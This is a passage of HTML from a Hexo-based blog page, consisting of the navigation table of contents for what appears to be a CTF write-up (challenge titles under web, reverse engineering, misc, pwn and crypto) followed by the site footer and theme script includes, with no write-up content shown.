class="nav-text">web-one_last_image</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-Sequal-No-Uta"><span class="nav-text">web-Sequal No Uta</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-ez-read"><span class="nav-text">web-ez_read</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E7%99%BE%E5%B9%B4%E7%BB%A7%E6%89%BF"><span class="nav-text">web-百年继承</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-ez-seralize"><span class="nav-text">web-ez-seralize</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-eeeeezzzzzzZip"><span class="nav-text">web-eeeeezzzzzzZip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E8%B7%AF%E5%9C%A8%E8%84%9A%E4%B8%8B"><span class="nav-text">web-路在脚下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-misc-%E8%A5%BF%E7%BA%B3%E6%99%AE%E6%96%AF%E7%9A%84%E8%AE%B8%E6%84%BF%E7%A2%91"><span class="nav-text">web-misc-西纳普斯的许愿碑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-Image-Viewer"><span class="nav-text">web-Image Viewer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-PDF-Viewer"><span class="nav-text">web-PDF Viewer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-Xross-The-Doom"><span class="nav-text">web-Xross The Doom</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E8%B7%AF%E5%9C%A8%E8%84%9A%E4%B8%8B-revenge"><span class="nav-text">web-路在脚下_revenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-ezjdbc"><span class="nav-text">web-ezjdbc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE"><span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#re-stack-bomb"><span class="nav-text">re-stack_bomb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-reReverse"><span class="nav-text">re-reReverse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-encode"><span class="nav-text">re-encode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-ez-pyyy"><span class="nav-text">re-ez_pyyy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-only-flower"><span class="nav-text">re-only_flower</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-ezRu3t"><span class="nav-text">re-ezRu3t</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-ezSMC"><span class="nav-text">re-ezSMC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-Her"><span class="nav-text">re-Her</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-QYQS%E3%81%AE%E5%A5%87%E5%A6%99%E5%86%92%E9%99%A9"><span class="nav-text">re-QYQSの奇妙冒险</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-Gensh1n"><span class="nav-text">re-Gensh1n</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-Mission-Ghost-Signal"><span class="nav-text">re-Mission Ghost Signal</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-QYQS%E3%81%AE%E5%A5%87%E5%A6%99%E5%86%92%E9%99%A92"><span class="nav-text">re-QYQSの奇妙冒险2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-GeekBinder"><span class="nav-text">re-GeekBinder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-ez-vm"><span class="nav-text">re-ez_vm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-ez-android"><span class="nav-text">re-ez_android</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-obfuscat3"><span class="nav-text">re-obfuscat3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-%E5%9B%BD%E4%BA%A7%E3%81%AE%E5%85%89"><span class="nav-text">re-国产の光</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-HTTP"><span class="nav-text">misc-HTTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-%F0%9F%97%83%EF%B8%8F%F0%9F%97%83%EF%B8%8F"><span class="nav-text">misc-🗃️🗃️</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-evil-mcp"><span class="nav-text">misc-evil_mcp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-Bite-off-picture"><span class="nav-text">misc-Bite off picture</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-Blockchain-SignIn"><span class="nav-text">misc-Blockchain SignIn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-1Z-Sign"><span class="nav-text">misc-1Z_Sign</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-Dream"><span class="nav-text">misc-Dream</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-Points"><span class="nav-text">misc-Points</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-Expression-Parser"><span class="nav-text">misc-Expression Parser</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-hidden"><span class="nav-text">misc-hidden</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-CRDT"><span class="nav-text">misc-CRDT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-Echo"><span class="nav-text">misc-Echo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-gift"><span class="nav-text">misc-gift</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC-describe-the-world"><span class="nav-text">MISC-describe_the_world</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-4ak5ra"><span class="nav-text">misc-4ak5ra</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC-%E9%97%AE%E5%8D%B7"><span class="nav-text">MISC-问卷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-monitoring"><span class="nav-text">misc-monitoring</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn-Mission-Cipher-Text"><span class="nav-text">pwn-Mission Cipher Text</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn-Mission-Calculator"><span class="nav-text">pwn-Mission Calculator</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-ez-xor"><span class="nav-text">crypto-ez_xor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-Caesar-Slot-Machine"><span class="nav-text">crypto-Caesar Slot Machine</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-ez-ecc"><span class="nav-text">crypto-ez_ecc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-pem"><span class="nav-text">crypto-pem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-baby-rabin"><span class="nav-text">crypto-baby_rabin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CRYPTO-xor-revenge"><span class="nav-text">CRYPTO-xor_revenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-dp-spill"><span class="nav-text">crypto-dp_spill</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-SBOX-revenge"><span class="nav-text">crypto-SBOX-revenge</span></a></li></ol></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2025</span> - 2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">tiran</a><p class="post-count space-x-0.5"><span>共撰写了 12 篇文章</span></p></div><script data-swup-reload-script src="https://cn.vercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">访问人数</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">总访问量</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span> <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span></div><div>博客已运行 <span class="odometer" id="runtime_days"></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div></main><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/Swup.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/SwupSlideTheme.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/SwupScriptsPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/SwupProgressPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/SwupScrollPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/imageViewer.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/utils.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/main.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/layouts/navbarShrink.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/scrollTopBottom.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/lightDarkSwitch.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/layouts/categoryList.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/codeBlock.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/layouts/lazyload.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/runtime.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/odometer.min.js"></script><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/assets/odometer-theme-minimal.css"><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/Typed.min.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/plugins/typed.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/anime.min.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/plugins/tabs.js" data-swup-reload-script></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/layouts/essays.js" data-swup-reload-script></script></body></html>